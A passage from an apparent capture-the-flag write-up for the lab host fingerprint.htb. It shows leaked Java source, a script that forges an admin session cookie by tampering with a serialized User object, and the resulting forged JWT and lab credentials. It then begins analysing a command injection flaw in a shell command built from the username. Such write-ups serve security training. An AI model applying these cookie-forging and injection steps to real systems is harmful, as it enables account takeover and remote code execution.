class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://fingerprint.htb:8080/backups/Profile.java</span></span><br><span class="line"><span class="keyword">package</span> com.admin.security.src.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.admin.security.src.profile.UserProfileStorage;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Profile</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">3995854114743474071L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;String&gt; logs;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> adminProfile;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> File avatar;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Profile <span class="title">getForUser</span><span class="params">(<span class="keyword">final</span> User user)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// fetch locally saved profile</span></span><br><span class="line">        <span class="keyword">final</span> File file = user.getProfileLocation();</span><br><span class="line"></span><br><span class="line">        Profile profile;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!file.isFile()) &#123;</span><br><span class="line">            <span class="comment">// no file -&gt; create empty profile</span></span><br><span class="line">            profile = <span class="keyword">new</span> Profile(<span class="keyword">new</span> ArrayList&lt;&gt;(), user.isAdmin());</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                user.updateProfile(profile);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> IOException ignored) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// init logs etc.</span></span><br><span class="line">        profile = <span class="keyword">new</span> UserProfileStorage(user).readProfile();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> profile;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://fingerprint.htb:8080/backups/User.java</span></span><br><span class="line"><span class="keyword">package</span> com.admin.security.src.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.admin.security.src.utils.FileUtil;</span><br><span class="line"><span class="keyword">import</span> com.admin.security.src.utils.SerUtils;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.*;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="comment">// import com.admin.security.src.model.UserProfileStorage;</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Table(name = &quot;users&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">7780857363453462165L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span></span><br><span class="line">    <span class="meta">@Column(name = &quot;id&quot;)</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column(name = &quot;username&quot;)</span></span><br><span class="line">    <span class="keyword">protected</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column(name = &quot;password&quot;)</span></span><br><span class="line">    <span class="keyword">protected</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column(name = &quot;fingerprint&quot;)</span></span><br><span class="line">    <span class="keyword">protected</span> String fingerprint;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> File <span class="title">getProfileLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> File dir = <span class="keyword">new</span> File(<span class="string">&quot;/data/sessions/&quot;</span>);</span><br><span class="line">        dir.mkdirs();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> String pathname = dir.getAbsolutePath() + <span class="string">&quot;/&quot;</span> + username + <span class="string">&quot;.ser&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> Paths.get(pathname).normalize().toFile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAdmin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username.equals(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateProfile</span><span class="params">(<span class="keyword">final</span> Profile profile)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] res = SerUtils.toByteArray(profile);</span><br><span class="line">        FileUtil.write(res, getProfileLocation());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We can see here the application logic of session management and understand how the serialized token we found in our cookie is being created.</p><p>An interesting line is the quite simple <code>isAdmin()</code> check:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAdmin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> username.equals(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This means if we get control of just the <code>username</code> field only we can become Admin of the application.</p><h3 id="Admin-cookie-forging"><a href="#Admin-cookie-forging" class="headerlink" title="Admin cookie forging"></a>Admin cookie forging</h3><p>Earlier when we retrieve the <code>[app.py](http://app.py)</code> file of the main application we obtained the <code>SECRET_KEY</code> which, in a Flask application, is used to sign session token (JWT). If we can rewrite the serialized cookie to replace the username with <code>admin</code> we will be able to forge a valid JWT token to give us access to the <code>admin</code> account.</p><p>Using the code source of the <code>[User.java](http://User.java)</code> we retrieved earlier we can create a script to revert the serialize function after modifying our username to <code>admin</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com/admin/security/src/model/AdminSerialize.java</span></span><br><span class="line"><span class="keyword">package</span> com.admin.security.src.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminSerialize</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] serializedUserBytes = Base64.getDecoder().decode(<span class="string">&quot;rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAnQAQDdlZjUyYzI1MWY4MDQ0Y2IxODcwMTM5OTI4OTFkMGU1OGNlOTE5NGRlN2Y1MzViMWI0ZmE2YmJmZTA4Njc4ZjZ0ABRMV2c3Z1VSMUVtWDdVTnhzSnhxWnQAC21pY2hlYWwxMjM1&quot;</span>);</span><br><span class="line">            ByteArrayInputStream serializedUserInputStream = <span class="keyword">new</span> ByteArrayInputStream(serializedUserBytes);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// https://gist.github.com/andy722/1524968</span></span><br><span class="line">            ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(serializedUserInputStream);</span><br><span class="line">            User user = (User)objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;[+] Cookie user information deserialized.&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;ID: &quot;</span> + user.getId());</span><br><span class="line">            System.out.println(<span class="string">&quot;Username: &quot;</span> + user.getUsername());</span><br><span class="line">            System.out.println(<span class="string">&quot;Password: &quot;</span> + user.getPassword());</span><br><span class="line">            System.out.println(<span class="string">&quot;Fingerprint: &quot;</span> + user.getFingerprint());</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;\n[+] Replacing username to &#x27;admin&#x27; and serializing the Object.&quot;</span>);</span><br><span class="line">            user.setUsername(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;ID: &quot;</span> + user.getId());</span><br><span class="line">            System.out.println(<span class="string">&quot;Username: &quot;</span> + user.getUsername());</span><br><span class="line">            System.out.println(<span class="string">&quot;Password: &quot;</span> + user.getPassword());</span><br><span class="line">            System.out.println(<span class="string">&quot;Fingerprint: &quot;</span> + user.getFingerprint());</span><br><span class="line"></span><br><span class="line">            ByteArrayOutputStream serializedUserOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(serializedUserOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(user);</span><br><span class="line"></span><br><span class="line">            String serializedAdminUserBase64 = Base64.getEncoder().encodeToString(serializedUserOutputStream.toByteArray());</span><br><span class="line">            System.out.println(<span class="string">&quot;\n[+] Serialization of the new user. \n&quot;</span> + serializedAdminUserBase64);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException | ClassNotFoundException ex) &#123;</span><br><span class="line">            System.out.println(ex.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com/admin/security/src/model/User.java</span></span><br><span class="line"><span class="keyword">package</span> com.admin.security.src.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">7780857363453462165L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String fingerprint;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        id = <span class="number">0</span>;</span><br><span class="line">        username = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        password = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        fingerprint = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">String <span class="title">getFingerprint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> fingerprint;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setFingerPrint</span><span class="params">(String fingerprint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.fingerprint = fingerprint;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ javac com/admin/security/src/model/AdminSerialize.java</span><br><span class="line">[hg8@archbook ~]$ java com.admin.security.src.model.AdminSerialize</span><br><span class="line">[+] Cookie user information deserialized.</span><br><span class="line">ID: 2</span><br><span class="line">Username: micheal1235</span><br><span class="line">Password: LWg7gUR1EmX7UNxsJxqZ</span><br><span class="line">Fingerprint: 7ef52c251f8044cb187013992891d0e58ce9194de7f535b1b4fa6bbfe08678f6</span><br><span class="line"></span><br><span class="line">[+] Replacing username to <span class="string">&#x27;admin&#x27;</span> and serializing the Object.</span><br><span class="line">ID: 2</span><br><span class="line">Username: admin</span><br><span class="line">Password: LWg7gUR1EmX7UNxsJxqZ</span><br><span class="line">Fingerprint: 7ef52c251f8044cb187013992891d0e58ce9194de7f535b1b4fa6bbfe08678f6</span><br><span class="line"></span><br><span class="line">[+] Serialization of the new user.</span><br><span class="line">rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAnQAQDdlZjUyYzI1MWY4MDQ0Y2IxODcwMTM5OTI4OTFkMGU1OGNlOTE5NGRlN2Y1MzViMWI0ZmE2YmJmZTA4Njc4ZjZ0ABRMV2c3Z1VSMUVtWDdVTnhzSnhxWnQABWFkbWlu</span><br></pre></td></tr></table></figure><p>Let’s use <a href="http://jwt.io/">jwt.io</a> to forge the new JWT:</p><p><img src="https://user-images.githubusercontent.com/9076747/163730221-3b859aa4-7448-4a39-b7fa-26169416626c.png" alt="https://user-images.githubusercontent.com/9076747/163730221-3b859aa4-7448-4a39-b7fa-26169416626c.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoick8wQUJYTnlBQ0ZqYjIwdVlXUnRhVzR1YzJWamRYSnBkSGt1YzNKakxtMXZaR1ZzTGxWelpYS1VCTmR6NDErNWF3SUFCRWtBQW1sa1RBQUxabWx1WjJWeWNISnBiblIwQUJKTWFtRjJZUzlzWVc1bkwxTjBjbWx1Wnp0TUFBaHdZWE56ZDI5eVpIRUFmZ0FCVEFBSWRYTmxjbTVoYldWeEFINEFBWGh3QUFBQUFuUUFRRGRsWmpVeVl6STFNV1k0TURRMFkySXhPRGN3TVRNNU9USTRPVEZrTUdVMU9HTmxPVEU1TkdSbE4yWTFNelZpTVdJMFptRTJZbUptWlRBNE5qYzRaalowQUJSTVYyYzNaMVZTTVVWdFdEZFZUbmh6U25oeFduUUFCV0ZrYldsdSJ9.lPDqZy7OX9cBclkxmK9gAx4SWiad_YFrjezvJO1apCA</span><br></pre></td></tr></table></figure><p>We can now replace our current cookie with the newly forged cookie to access the <code>admin</code> account. </p><p><img src="https://user-images.githubusercontent.com/9076747/163730383-9cd288ba-5d3a-4057-a79c-a573d8a707bc.png" alt="https://user-images.githubusercontent.com/9076747/163730383-9cd288ba-5d3a-4057-a79c-a573d8a707bc.png"></p><p>As <code>admin</code> the only additional function we seem to get is access to a “Recent Logs” display. At first sight it looks like this admin cookie doesn’t give us access to anything valuable. </p><h3 id="Command-Injection-to-Remote-Code-Execution"><a href="#Command-Injection-to-Remote-Code-Execution" class="headerlink" title="Command Injection to Remote Code Execution"></a>Command Injection to Remote Code Execution</h3><p>Once again let’s go back and check what we might have missed.<br>One thing I overlooked is the import of <a href="http://fingerprint.htb:8080/backups/UserProfileStorage.java"><code>UserProfileStorage.java</code></a> in the <code>[Profile.java](http://Profile.java)</code> file. The file is also accessible on the <code>/backups/</code> folder, let’s take a look:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://fingerprint.htb:8080/backups/UserProfileStorage.java</span></span><br><span class="line"><span class="keyword">package</span> com.admin.security.src.profile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.admin.security.src.model.Profile;</span><br><span class="line"><span class="keyword">import</span> com.admin.security.src.model.User;</span><br><span class="line"><span class="keyword">import</span> com.admin.security.src.utils.SerUtils;</span><br><span class="line"><span class="keyword">import</span> com.admin.security.src.utils.Terminal;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.admin.security.src.profile.Settings.AUTH_LOG;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserProfileStorage</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5667788713462095525L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> User user;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(<span class="keyword">final</span> ObjectInputStream inputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        inputStream.defaultReadObject();</span><br><span class="line">        readProfile();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Profile <span class="title">readProfile</span><span class="params">()</span> <span class="keyword">throws</span> IllegalStateException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> File profileFile = user.getProfileLocation();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> Path path = Paths.get(profileFile.getAbsolutePath());</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">byte</span>[] content = Files.readAllBytes(path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> Profile profile = (Profile) SerUtils.from(content);</span><br><span class="line">            <span class="keyword">if</span> (profile.isAdminProfile()) &#123; <span class="comment">// load authentication logs only for super user</span></span><br><span class="line">                profile.getLogs().clear();</span><br><span class="line">                <span class="keyword">final</span> String cmd = <span class="string">&quot;cat &quot;</span> + AUTH_LOG.getAbsolutePath() + <span class="string">&quot; | grep &quot;</span> + user.getUsername();</span><br><span class="line">                profile.getLogs().addAll(Arrays.asList(Terminal.run(cmd).split(<span class="string">&quot;\n&quot;</span>)));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> profile;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Error fetching profile&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The following part is very interesting:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (profile.isAdminProfile()) &#123; <span class="comment">// load authentication logs only for super user</span></span><br><span class="line">    profile.getLogs().clear();</span><br><span class="line">    <span class="keyword">final</span> String cmd = <span class="string">&quot;cat &quot;</span> + AUTH_LOG.getAbsolutePath() + <span class="string">&quot; | grep &quot;</span> + user.getUsername();</span><br><span class="line">    profile.getLogs().addAll(Arrays.asList(Terminal.run(cmd).split(<span class="string">&quot;\n&quot;</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We can quickly identify a Command Injection vulnerability from the <code>username</code> field.</p><p>Let’s break it down to see how it can be exploited.</p><ol><li>We understand the <code>admin</code> profile file is being stored in <code>/data/sessions/admin.ser</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// User.java:39</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> File <span class="title">getProfileLocation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> File dir = <span class="keyword">new</span> File(<span class="string">&quot;/data/sessions/&quot;</span>);</span><br><span class="line">    dir.mkdirs();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> String pathname = dir.getAbsolutePath() + <span class="string">&quot;/&quot;</span> + username + <span class="string">&quot;.ser&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> 